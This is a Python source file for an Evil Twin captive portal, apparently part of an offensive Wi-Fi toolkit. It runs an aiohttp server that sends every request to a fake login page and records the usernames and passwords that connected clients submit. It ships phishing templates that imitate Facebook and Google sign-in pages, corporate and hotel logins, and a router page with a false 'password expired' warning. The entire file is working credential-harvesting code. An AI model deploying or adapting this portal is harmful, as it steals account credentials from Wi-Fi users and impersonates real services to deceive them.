"""
Captive Portal for Evil Twin attacks.

Serves fake login pages to capture credentials from connected clients.
Supports multiple templates (hotel, corporate, social media, etc).
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class PortalTemplate(str, Enum):
    """Pre-built captive portal templates."""
    GENERIC = "generic"
    HOTEL = "hotel"
    CORPORATE = "corporate"
    FACEBOOK = "facebook"
    GOOGLE = "google"
    ROUTER = "router"
    CUSTOM = "custom"


@dataclass
class CapturedCredential:
    """Captured login credential."""
    timestamp: datetime = field(default_factory=lambda: datetime.now(UTC))
    client_mac: str = ""
    client_ip: str = ""
    username: str = ""
    password: str = ""
    user_agent: str = ""
    extra_fields: dict[str, str] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "timestamp": self.timestamp.isoformat(),
            "client_mac": self.client_mac,
            "client_ip": self.client_ip,
            "username": self.username,
            "password": self.password,
            "user_agent": self.user_agent,
            "extra_fields": self.extra_fields,
        }


@dataclass
class PortalConfig:
    """Captive portal configuration."""
    template: PortalTemplate = PortalTemplate.GENERIC
    custom_html: str | None = None
    title: str = "WiFi Login"
    logo_url: str | None = None
    primary_color: str = "#007bff"
    redirect_url: str = "https://www.google.com"
    port: int = 80
    ssl_enabled: bool = False


class CaptivePortal:
    """
    Captive Portal Server for credential harvesting.
    
    Serves fake login pages and captures submitted credentials.
    Uses aiohttp for async HTTP serving.
    
    Usage:
        portal = CaptivePortal(config)
        portal.on_credential = my_callback
        await portal.start()
        
        # Credentials will be passed to callback
        await portal.stop()
    """
    
    def __init__(
        self,
        config: PortalConfig | None = None,
        on_credential: Any = None,
    ) -> None:
        self.config = config or PortalConfig()
        self.on_credential = on_credential
        self._server: Any = None
        self._app: Any = None
        self._running = False
        self._credentials: list[CapturedCredential] = []
        
        self._stats = {
            "page_views": 0,
            "credentials_captured": 0,
            "unique_clients": set(),
        }
    
    @property
    def credentials(self) -> list[CapturedCredential]:
        return list(self._credentials)
    
    @property
    def stats(self) -> dict[str, int]:
        return {
            "page_views": self._stats["page_views"],
            "credentials_captured": self._stats["credentials_captured"],
            "unique_clients": len(self._stats["unique_clients"]),
        }
    
    async def start(self) -> bool:
        """Start the captive portal server."""
        try:
            from aiohttp import web
            
            self._app = web.Application()
            self._app.router.add_get("/", self._handle_index)
            self._app.router.add_get("/login", self._handle_index)
            self._app.router.add_post("/login", self._handle_login)
            self._app.router.add_get("/success", self._handle_success)
            self._app.router.add_route("*", "/{path:.*}", self._handle_catch_all)
            
            runner = web.AppRunner(self._app)
            await runner.setup()
            
            self._server = web.TCPSite(
                runner,
                "0.0.0.0",
                self.config.port,
            )
            await self._server.start()
            
            self._running = True
            logger.info("Captive portal started on port %d", self.config.port)
            return True
            
        except ImportError:
            logger.error("aiohttp not installed")
            return False
        except Exception as e:
            logger.error("Failed to start portal: %s", e)
            return False
    
    async def stop(self) -> None:
        """Stop the captive portal server."""
        self._running = False
        if self._server:
            await self._server.stop()
        logger.info("Captive portal stopped")
    
    async def _handle_index(self, request: Any) -> Any:
        """Serve the login page."""
        from aiohttp import web
        
        client_ip = request.remote
        self._stats["page_views"] += 1
        self._stats["unique_clients"].add(client_ip)
        
        html = self._render_template()
        return web.Response(text=html, content_type="text/html")
    
    async def _handle_login(self, request: Any) -> Any:
        """Handle login form submission."""
        from aiohttp import web
        
        try:
            data = await request.post()
            
            credential = CapturedCredential(
                client_ip=request.remote,
                username=data.get("username", data.get("email", "")),
                password=data.get("password", ""),
                user_agent=request.headers.get("User-Agent", ""),
                extra_fields={k: v for k, v in data.items() if k not in ("username", "email", "password")},
            )
            
            self._credentials.append(credential)
            self._stats["credentials_captured"] += 1
            
            logger.warning(
                "Credential captured: %s from %s",
                credential.username,
                credential.client_ip,
            )
            
            # Callback if set
            if self.on_credential:
                try:
                    if asyncio.iscoroutinefunction(self.on_credential):
                        await self.on_credential(credential)
                    else:
                        self.on_credential(credential)
                except Exception as e:
                    logger.error("Credential callback error: %s", e)
            
            # Redirect to success/internet
            return web.HTTPFound(location="/success")
            
        except Exception as e:
            logger.error("Login handler error: %s", e)
            return web.HTTPFound(location="/")
    
    async def _handle_success(self, request: Any) -> Any:
        """Show success page and redirect to internet."""
        from aiohttp import web
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Connected!</title>
    <meta http-equiv="refresh" content="3;url={self.config.redirect_url}">
    <style>
        body {{ font-family: -apple-system, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }}
        .success {{ color: #28a745; font-size: 48px; }}
    </style>
</head>
<body>
    <div class="success">✓</div>
    <h1>Connected!</h1>
    <p>Redirecting to internet...</p>
</body>
</html>"""
        return web.Response(text=html, content_type="text/html")
    
    async def _handle_catch_all(self, request: Any) -> Any:
        """Catch all requests and redirect to login."""
        from aiohttp import web
        return web.HTTPFound(location="/login")
    
    def _render_template(self) -> str:
        """Render the login page template."""
        if self.config.custom_html:
            return self.config.custom_html
        
        template = self.config.template
        
        if template == PortalTemplate.GENERIC:
            return self._template_generic()
        elif template == PortalTemplate.HOTEL:
            return self._template_hotel()
        elif template == PortalTemplate.CORPORATE:
            return self._template_corporate()
        elif template == PortalTemplate.FACEBOOK:
            return self._template_facebook()
        elif template == PortalTemplate.GOOGLE:
            return self._template_google()
        elif template == PortalTemplate.ROUTER:
            return self._template_router()
        else:
            return self._template_generic()
    
    def _template_generic(self) -> str:
        """Generic WiFi login template."""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>{self.config.title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh;
                display: flex; align-items: center; justify-content: center; }}
        .container {{ background: white; padding: 40px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                     width: 100%; max-width: 400px; margin: 20px; }}
        h1 {{ color: #333; margin-bottom: 10px; font-size: 24px; }}
        p {{ color: #666; margin-bottom: 30px; }}
        .form-group {{ margin-bottom: 20px; }}
        label {{ display: block; color: #333; margin-bottom: 5px; font-weight: 500; }}
        input {{ width: 100%; padding: 14px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 16px; }}
        input:focus {{ border-color: {self.config.primary_color}; outline: none; }}
        button {{ width: 100%; padding: 14px; background: {self.config.primary_color}; color: white; 
                 border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }}
        button:hover {{ opacity: 0.9; }}
        .terms {{ font-size: 12px; color: #999; margin-top: 20px; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>📶 {self.config.title}</h1>
        <p>Please sign in to access the internet</p>
        <form method="POST" action="/login">
            <div class="form-group">
                <label>Email or Username</label>
                <input type="text" name="username" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit">Connect</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>"""
    
    def _template_hotel(self) -> str:
        """Hotel WiFi login template."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Hotel Guest WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Georgia, serif; background: #1a1a2e; color: #eee; min-height: 100vh; 
               display: flex; align-items: center; justify-content: center; }
        .container { background: linear-gradient(to bottom, #16213e, #0f3460); padding: 50px; 
                    border-radius: 8px; max-width: 450px; border: 1px solid #e94560; }
        h1 { color: #e94560; margin-bottom: 5px; }
        .subtitle { color: #aaa; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border: none; border-radius: 4px; }
        button { width: 100%; padding: 15px; background: #e94560; color: white; border: none; 
                 border-radius: 4px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏨 Welcome Guest</h1>
        <p class="subtitle">Enter your room number and last name to connect</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Room Number" required>
            <input type="text" name="password" placeholder="Last Name" required>
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
</body>
</html>"""
    
    def _template_corporate(self) -> str:
        """Corporate network login template."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Corporate Network Access</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; min-height: 100vh;
               display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 32px; }
        h2 { color: #1a73e8; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; 
                 border-radius: 4px; cursor: pointer; }
        .help { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏢</div>
        <h2>Network Authentication</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Domain\\Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p class="help">Contact IT Help Desk for assistance</p>
    </div>
</body>
</html>"""
    
    def _template_facebook(self) -> str:
        """Facebook-style login template."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Log in to Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; }
        .header { background: #1877f2; padding: 15px; text-align: center; }
        .header h1 { color: white; font-size: 28px; margin: 0; }
        .container { max-width: 400px; margin: 40px auto; background: white; padding: 20px; 
                    border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; 
               border-radius: 6px; font-size: 17px; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none;
                border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .divider { text-align: center; margin: 20px 0; color: #ccc; }
        .create { text-align: center; }
        .create a { color: #42b72a; font-size: 17px; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header"><h1>facebook</h1></div>
    <div class="container">
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">─── or ───</div>
        <div class="create"><a href="#">Create new account</a></div>
    </div>
</body>
</html>"""
    
    def _template_google(self) -> str:
        """Google-style login template."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; margin: 0; 
               display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { max-width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 16px; font-size: 48px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 24px; border: 1px solid #dadce0; 
               border-radius: 4px; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; }
        button { background: #1a73e8; color: white; padding: 10px 24px; border: none; 
                border-radius: 4px; font-size: 14px; cursor: pointer; float: right; }
        .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">G</div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form method="POST" action="/login">
            <input type="email" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>"""
    
    def _template_router(self) -> str:
        """Router admin login template."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Router Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #2c3e50; margin: 0; 
               display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { background: #ecf0f1; padding: 30px; border-radius: 4px; max-width: 350px; }
        h2 { color: #2c3e50; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #bdc3c7; }
        button { width: 100%; padding: 10px; background: #3498db; color: white; border: none; cursor: pointer; }
        .warning { background: #f39c12; color: white; padding: 10px; margin-bottom: 20px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📡 Router Login</h2>
        <div class="warning">⚠️ Your WiFi password has expired. Please re-enter to continue.</div>
        <form method="POST" action="/login">
            <input type="text" name="username" value="admin" readonly>
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Update & Connect</button>
        </form>
    </div>
</body>
</html>"""
    
    def get_metrics(self) -> dict[str, int]:
        """Get Prometheus-compatible metrics."""
        return {
            "momo_portal_views_total": self._stats["page_views"],
            "momo_portal_credentials_total": self._stats["credentials_captured"],
            "momo_portal_unique_clients": len(self._stats["unique_clients"]),
        }

